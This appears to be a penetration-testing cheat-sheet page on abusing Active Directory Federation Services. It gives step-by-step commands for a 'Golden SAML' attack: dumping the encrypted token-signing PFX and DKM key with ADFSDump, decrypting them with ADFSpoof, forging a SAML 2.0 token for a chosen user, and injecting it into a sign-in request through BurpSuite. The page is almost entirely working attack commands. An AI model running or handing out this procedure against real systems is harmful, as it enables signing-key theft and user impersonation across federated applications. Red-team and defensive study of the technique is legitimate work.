---
title: "ADFS"
date: 2024-9-14
tags: ["ADFS", "active driectory", "ad", "Windows", "Federation Services", "SAML"]
---

### Abuse #1: Generate a SAML 2.0 token for some app

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Dump encrypted PFX and DKM key

<div>

```console
# With ADFS service account
.\ADFSDump.exe
```

</div>

<small>*Ref: [ADFSDump](https://github.com/mandiant/ADFSDump)*</small>

#### 2. Convert to binary blob

<div>

```console
# Copy private key(s)
echo '<PRIVATE_KEY>' | sed 's/-//g' | xxd -r -p > DkmKey.bin
```

```console
# Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
cat b64_blob | base64 -d > EncryptedPfx.bin
```

</div>

#### 3. Check which private key is correct

<div>

```console
# The correct key will not show error
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
```

</div>

<small>*Ref: [ADFSpoof](https://github.com/mandiant/ADFSpoof)*</small>

#### 4. Generate SAML 2.0 token

<div>

```console
# Copy info from ADFS dump
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <SERVER> saml2 --endpoint <SIGN_IN_ENDPOINT> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <SPOOF_USER>@<DOMAIN> --rpidentifier <IDENTIFIER> --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue><SPOOF_USER>@<DOMAIN></AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue><SPOOF_USER></AttributeValue></Attribute>' 
```

</div>

#### 5. Modify request in BurpSuite

<div>

```console
+-------------------------------------------------------------+
| 1. Enable Intercept in Proxy Tab                            |
| 2. Sign In with the Web App                                 |
| 3. Click Forward until the POST request with 'SAMLResponse' |
| 4. Replace the payload and Forward                          |
| 5. Disable Intercept and profit                             |
+-------------------------------------------------------------+
```

</div>

{{< /tabcontent >}}

<br>